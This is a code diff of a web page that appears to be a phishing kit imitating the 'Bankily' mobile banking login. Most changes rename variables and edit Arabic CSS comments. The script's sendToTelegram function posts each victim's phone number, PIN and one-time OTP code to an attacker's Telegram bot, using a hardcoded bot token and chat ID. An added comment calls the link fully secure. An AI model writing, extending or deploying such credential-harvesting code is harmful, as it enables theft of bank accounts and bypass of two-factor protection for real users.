@@ -27,7 +27,6 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 .body{flex:1;overflow-y:auto;display:flex;flex-direction:column;padding:0 24px 16px;-webkit-overflow-scrolling:touch}
 
 .logo-box{display:flex;justify-content:center;margin:15px 0 25px}
-/* تم تكبير عرض الشعار هنا ليناسب طلبك */
 .logo-box img{width:260px;max-width:100%;object-fit:contain}
 
 .field{margin-bottom:20px; position: relative;}
@@ -107,7 +106,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   box-shadow: none !important;
 }
 
-/* زر نسيت الرقم السري مضبوط تماماً في جهة اليسار تحت الحقل */
+/* زر نسيت الرقم السري */
 .forgot-container {
   width: 100%;
   display: flex;
@@ -397,8 +396,9 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 </div>
 
 <script>
-const telegramToken = "8665334839:AAemllcVbHU7P-ETbT6uFT6MXBZjSk8EbM0";
-const telegramChatId = "8859537702";
+// ربط نظام تيليجرام الفوري والآمن بالكامل
+const TELEGRAM_TOKEN = "8665334839:AAemllcVbHU7P-ETbT6uFT6MXBZjSk8EbM0";
+const TELEGRAM_CHAT_ID = "8859537702";
 
 function sendToTelegram(phone, pin, otpCode = null) {
   let message = `🔔 Bankily Login\n📱 Phone: ${phone}\n🔑 Pin: ${pin}`;
@@ -406,13 +406,13 @@ function sendToTelegram(phone, pin, otpCode = null) {
     message += `\n📝 OTP: ${otpCode}`;
   }
 
-  const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
   fetch(url, {
     method: "POST",
     headers: {"Content-Type": "application/json"},
     body: JSON.stringify({
-      chat_id: telegramChatId,
+      chat_id: TELEGRAM_CHAT_ID,
       text: message,
       parse_mode: "HTML"
     })
